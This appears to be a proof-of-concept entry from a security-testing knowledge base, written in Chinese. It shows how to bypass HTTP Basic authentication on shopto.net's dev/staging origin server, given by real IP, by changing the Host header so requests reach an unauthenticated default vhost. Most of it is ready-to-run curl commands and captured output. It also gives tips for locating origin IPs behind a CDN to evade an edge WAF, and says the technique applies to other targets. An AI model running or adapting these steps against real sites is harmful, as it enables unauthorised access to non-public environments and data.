# shopto.net dev/staging 源站(3.8.196.174) Host 头绕过 HTTP Basic 门禁 → 非预期访问完整 storefront

- **code**: shopto-origin-host-header-bypass-basic-auth-dev-staging
- **kind**: poc
- **category**: auth-bypass
- **component**: nginx 多 vhost（dev/staging 虚拟主机 HTTP Basic）+ ShopTo storefront
- **severity**: medium
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 14:30-14:44 UTC，ARTEX 执行机 curl（经平台记录代理）打 dev/staging 源站 3.8.196.174。① 基线 `curl -sk --http1.0 --resolve dev.shopto.net:443:3.8.196.174 -H 'Host: dev.shopto.net' https://3.8.196.174/` → HTTP/1.0 401，`Www-Authenticate: Basic realm="Restricted area"`；② 仅把 Host 换成非 *.shopto.net 值 `-H 'Host: localhost'` → HTTP/1.0 200、size=280690、title="Buy and Pre-order Video Consoles & More | ShopTo.net"、Set-Cookie: sidb2c=...（有完整回显）；③ `-H 'Host: foo.bar.baz'` 与裸 IP 同样 200/280690 字节（证明非 localhost 特例，而是默认/catch-all vhost 未加认证）；④ 受保护的 dev vhost 上 `/module/dcshop/b2c/ajax_cart.php` 仍 200 返回 JSON 3482 字节（该接口未纳入 Basic 保护）。据此判定 Basic 门禁被 Host 头完全绕过，非预期访问验证完整 storefront 成立。
- **path**: pocs/shopto-origin-host-header-bypass-basic-auth-dev-staging/poc.md
- **tags**: auth-bypass,auth-validate,host头,basic-auth,401,realm,源站,默认vhost,dev,staging,shopto.net,cloudfront,waf-bypass,recon,多租户
- **created_at**: 2026-11-11T14:49:02.189Z
- **engine**: 3.8.196.174（dev.shopto.net / staging.shopto.net 源站，https://3.8.196.174）

## 描述

原理：dev.shopto.net / staging.shopto.net 的源站 3.8.196.174 在 vhost 层加了 HTTP Basic（realm="Restricted area"）保护，但同一 nginx 上的默认/catch-all vhost 未加认证且指向同一 docroot。请求只要把 Host 头换成任意非 *.shopto.net 值（localhost / 127.0.0.1 / foo.bar.baz / 裸 IP），即落到免认证的默认 vhost，直接返回 280690 字节的完整 ShopTo 商城首页（canonical 指向 www.shopto.net），Basic 门禁被完全绕过。前提：能直连源站 443（该 IP 无 CloudFront 边缘，可作绕过边缘 WAF 的通道），且必须用 HTTP/1.0。适用面：任何「源站多 vhost 共置 + 部分 vhost 用 Basic/网关认证保护、默认 vhost 未同步加认证」的目标。同源站的另一面（默认 vhost /error 跨租户泄露 + 内网 IP + CIS 指纹）见库内条目 527，二者互补：527 证明默认 vhost 存在，本条证明默认 vhost 可用来绕过受保护 vhost 的认证。

## 用法

```
前置：可访问 3.8.196.174:443（公网直达，无 CDN），curl 加 -k；**必须 HTTP/1.0**（--http1.0），HTTP/1.1 打 / 会 empty reply。

【1) 基线：确认合法 dev vhost 受 Basic 保护】
curl -sk --http1.0 --resolve dev.shopto.net:443:3.8.196.174 \
     -H 'Host: dev.shopto.net' https://3.8.196.174/ -D -
# 期望：HTTP/1.0 401 Unauthorized + Www-Authenticate: Basic realm="Restricted area"（Content-Length: 0）

【2) 关键一步：Host 换成任意非 *.shopto.net 值，落到免认证默认 vhost】
for H in localhost 127.0.0.1 foo.bar.baz 3.8.196.174; do
  curl -sk --http1.0 -H "Host: $H" https://3.8.196.174/ \
       -o "rt_$H.html" -w "Host=$H %{http_code} %{size_download}\n"
  grep -o '<title>[^<]*' "rt_$H.html" | head -1
done
# 命中特征：全部 200、size≈280690、title 含 shopto.net 商城名，响应头有 Set-Cookie: sidb2c=...

【3) 判据（同时成立才算绕过）】
# a. Host: dev.shopto.net -> 401；Host: localhost -> 200（对照强烈）
# b. 200 的正文体积与基线主站一致（完整 storefront，不是错误页/跳转）
# c. 多个不同的非 *.shopto.net Host 结果逐字节一致 => 是 catch-all/默认 vhost 未加认证，
#    而非某个特定域名被白名单

【4) 顺带：受保护 vhost 上的接口是否也免认证（未纳入 Basic）】
curl -sk --http1.0 -H 'Host: dev.shopto.net' \
     https://3.8.196.174/module/dcshop/b2c/ajax_cart.php
# 本例：HTTP/1.0 200 返回 {"status":"ok","content":"..."}（3482 字节）—— 受保护 vhost 上该路径同样未走认证

【5) 加固/绕行要点】
- 若源站被 CDN 挡：先按 TLS 证书 SAN / 子域枚举找不走 CDN 的源站 IP（本 IP 即 dev/staging 的直连源站，无 CloudFront），再直连发 Host。
- 若 HTTP/1.1 empty reply：换 --http1.0 重试（此目标默认 server 只在 HTTP/1.0 下回退）。
- 失败常见原因：默认 vhost 已加 Host 白名单/认证；httpd 对未知 Host 直接 444/404；源站仅内网可达；Host 用了带 *.shopto.net 后缀的值（仍命中受保护 vhost 得 401）。
```

## 正文

```
# shopto.net dev/staging 源站 HTTP Basic 门禁可被 Host 头绕过 → 非预期访问完整 storefront

归类：auth-validate control（认证校验/访问控制失效）→ auth-bypass
严重度：medium
来源：task#4 shopto.net 全流程安全验证，finding_id=61（verdict=verified）

## 目标 / 入口
- 源站 IP：`3.8.196.174`（`dev.shopto.net` / `staging.shopto.net` 的 A 记录，直达公网，**无 CloudFront 边缘**，可作绕过边缘 WAF 的通道）
- 入口：`https://3.8.196.174/`，用 `-H 'Host: ...'` 切换 vhost
- 端口：443（HTTPS）

## 前置条件
- 能直连 `3.8.196.174:443`（公网可达）
- curl 加 `-k` 忽略证书
- **必须用 HTTP/1.0**（`--http1.0`）：HTTP/1.1 打 `/` 会得到 empty reply

## 复现步骤（实测）

### 1) 基线：合法 dev vhost 受 HTTP Basic 保护
```bash
curl -sk --http1.0 --resolve dev.shopto.net:443:3.8.196.174 \
     -H 'Host: dev.shopto.net' https://3.8.196.174/ -D -
```
回显：
```
HTTP/1.0 401 Unauthorized
Www-Authenticate: Basic realm="Restricted area"
Content-Length: 0
```

### 2) 关键一步：Host 换成任意非 *.shopto.net 值 → 绕过门禁，拿到完整商城主页
```bash
curl -sk --http1.0 -H 'Host: localhost' https://3.8.196.174/ \
     -o rt_localhost.html -w '\n%{http_code} %{size_download}\n'
```
回显（完整回显，非错误页）：
```
HTTP/1.0 200 OK
... Set-Cookie: sidb2c=<REDACTED>; path=/; SameSite=Lax; secure; HttpOnly
<title>Buy and Pre-order Video Consoles & More | ShopTo.net</title>
200 280690
```

### 3) 证明不是 localhost 特例（默认/catch-all vhost 未加认证）
```bash
for H in 127.0.0.1 foo.bar.baz 3.8.196.174; do
  curl -sk --http1.0 -H "Host: $H" https://3.8.196.174/ \
       -o "rt_$H.html" -w "Host=$H %{http_code} %{size_download}\n"
done
```
回显：三种 Host 全部 `200`、`size=280690`，标题同为 ShopTo 商城 → 说明是默认 vhost 未做认证，而非某个域名被白名单。

### 4) 受保护的 dev vhost 上，部分接口也未纳入认证
```bash
curl -sk --http1.0 -H 'Host: dev.shopto.net' \
     https://3.8.196.174/module/dcshop/b2c/ajax_cart.php
```
回显：`HTTP/1.0 200  {"status":"ok","content":"..."}`（3482 字节）—— 即使在需要 Basic 的 dev vhost 上，`/module/` 路径也未被认证覆盖。

## 判据（同时成立才算成立）
1. Host = `dev.shopto.net` → 401（`Www-Authenticate: Basic realm="Restricted area"`）；Host = 任意非 `*.shopto.net` → 200（强烈对照）。
2. 200 的正文体积与正常主站一致（完整 storefront ≈280690 字节），不是错误页/跳转页。
3. 多个不同的非 `*.shopto.net` Host 结果逐字节一致 ⇒ 命中 catch-all/默认 vhost，未同步加认证。

## 根因
同一 nginx 上多 vhost 共置：`dev/staging` 等 vhost 在 web 层加了 HTTP Basic，但**默认/catch-all vhost 未加认证且指向同一 docroot**；非 `*.shopto.net` 的 Host 落到默认 vhost，直接返回完整商城（canonical 指向 `www.shopto.net`），Basic 门禁被完全绕过。
（同源站的另一面 —— 默认 vhost `/error` 跨租户泄露 + 内网 IP `192.168.56.180` + DcCMS 2015 指纹 —— 见库内条目 id 527，二者互补。）

## 失败时的常见原因
- 用了 HTTP/1.1 → empty reply（必须 `--http1.0`）。
- Host 用了带 `*.shopto.net` 后缀的值 → 仍命中受保护 vhost，返回 401。
- 源站前有 CDN/边缘网关 → 先按 TLS 证书 SAN / 子域枚举找到不走 CDN 的源站 IP 再直连。
- 所有 Host 响应一致地 404/444 → 默认 vhost 已加 Host 白名单或被禁用。

## 风险与影响
未授权访问验证环境（dev/staging）的完整 storefront；该源站无 CloudFront，可绕过边缘 WAF 直接测接口，可能暴露仅限内网/预发可见的功能与数据。

```
